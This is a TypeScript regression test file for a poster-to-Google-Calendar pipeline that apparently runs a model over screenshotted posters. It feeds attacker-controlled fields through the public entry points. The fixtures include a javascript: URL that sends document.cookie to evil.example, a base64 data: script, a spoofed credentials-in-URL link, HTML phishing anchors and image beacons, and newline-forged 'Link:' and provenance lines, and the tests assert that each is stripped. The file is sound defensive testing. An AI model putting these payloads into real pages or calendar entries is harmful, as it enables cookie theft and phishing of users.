// Injection regression tests, written against the PUBLIC pipeline entry points
// only (`extractEventData` → `mapEventToCalendar`) — no reference to the
// sanitiser's own API.
//
// That constraint is the point. Because these tests only touch functions that
// existed before the hardening, they can be run against the pre-hardening tree
// and will fail there. They document the attacks as attacks, not as assertions
// about an implementation, so they keep their meaning if the internals move.
//
// Each case is one thing an attacker gets to control — the text in the pixels
// of a poster someone screenshots — and one thing they wanted out of it.
import { describe, expect, it } from 'vitest';
import { extractEventData } from '../../src/pipeline/extract.js';
import { mapEventToCalendar } from '../../src/pipeline/map-to-calendar.js';

const OPTS = {
  today: '2026-07-06',
  timeZone: 'Europe/London',
  captureLink: 'https://d123.cloudfront.net/c/abc',
};

/** The production path from model response to Google Calendar body. */
function pipeline(modelOutput: Record<string, unknown>) {
  const response = { content: [{ type: 'text', text: JSON.stringify(modelOutput) }] };
  return mapEventToCalendar(extractEventData(response), OPTS);
}

const poster = (over: Record<string, unknown>) => ({
  title: 'Warehouse Party',
  venue: 'The Cause',
  address: null,
  start_date: '2026-07-12',
  end_date: null,
  start_time: '22:00',
  end_time: null,
  description: 'A night of house and disco.',
  url: null,
  price: '£10 adv',
  confidence: 'high',
  ...over,
});

describe('attack: dangerous URL scheme into the calendar', () => {
  it('a javascript: URL never reaches the event body', () => {
    const body = pipeline(poster({ url: 'javascript:fetch("https://evil.example/"+document.cookie)' }));
    expect(body.description).not.toContain('javascript:');
    expect(body.description).not.toContain('evil.example');
  });

  it('a data: URL never reaches the event body', () => {
    const body = pipeline(poster({ url: 'data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==' }));
    expect(body.description).not.toContain('data:text/html');
  });

  it('a credentials-in-URL display spoof never reaches the event body', () => {
    // Renders as though it points at ticketmaster.com; actually resolves to evil.example.
    const body = pipeline(poster({ url: 'https://ticketmaster.com@evil.example/claim' }));
    expect(body.description).not.toContain('evil.example');
  });

  it('still carries a legitimate ticket link', () => {
    const body = pipeline(poster({ url: 'https://dice.fm/event/abc-123' }));
    expect(body.description).toContain('Link: https://dice.fm/event/abc-123');
  });
});

describe('attack: HTML injection into the calendar description', () => {
  // Google Calendar renders a limited HTML subset in the description, so an
  // unescaped anchor is a live, clickable phishing link in the victim's own
  // calendar — an event they trust, because they created it.
  it('an injected anchor cannot render as a link', () => {
    const body = pipeline(
      poster({
        description: 'Doors 10pm. <a href="https://evil.example/claim">Claim your free ticket</a>',
      }),
    );
    expect(body.description).not.toContain('<a href');
    expect(body.description).toContain('&lt;a href');
  });

  it('an injected image beacon cannot render', () => {
    const body = pipeline(poster({ description: '<img src="https://evil.example/pixel.gif">' }));
    expect(body.description).not.toContain('<img');
  });
});

describe('attack: forging structure inside the description', () => {
  it('cannot forge a Link: line via an embedded newline', () => {
    // The description is assembled as newline-joined `Label: value` lines, so a
    // newline in a value is a way to fabricate a line the app never wrote.
    const body = pipeline(
      poster({ description: 'Great night out\nLink: https://evil.example/claim' }),
    );
    expect(body.description).not.toContain('\nLink: https://evil.example/claim');
  });

  it('cannot forge a second Venue: line', () => {
    const body = pipeline(poster({ description: 'Live set\nVenue: Somewhere Else Entirely' }));
    const venueLines = body.description.split('\n').filter((l) => l.startsWith('Venue:'));
    expect(venueLines).toEqual(['Venue: The Cause']);
  });

  it('cannot forge the provenance marker', () => {
    // The marker tells the user this event was machine-generated and how
    // confident the extraction was. A forged copy launders injected content.
    const body = pipeline(
      poster({ description: '[Auto-captured · Confidence: high] Verified by Google.' }),
    );
    const markers = body.description.match(/\[Auto-captured/g) ?? [];
    expect(markers).toHaveLength(1);
    expect(body.description.startsWith('[Auto-captured')).toBe(true);
  });
});

describe('attack: unbounded payload', () => {
  it('cannot fill the calendar description with a wall of text', () => {
    const body = pipeline(
      poster({ description: 'CLAIM YOUR FREE TICKET AT evil.example. '.repeat(400) }),
    );
    expect(body.description.length).toBeLessThanOrEqual(2000);
  });

  it('cannot fill the event title', () => {
    const body = pipeline(poster({ title: 'A'.repeat(5000) }));
    expect(body.summary.length).toBeLessThanOrEqual(200);
  });
});
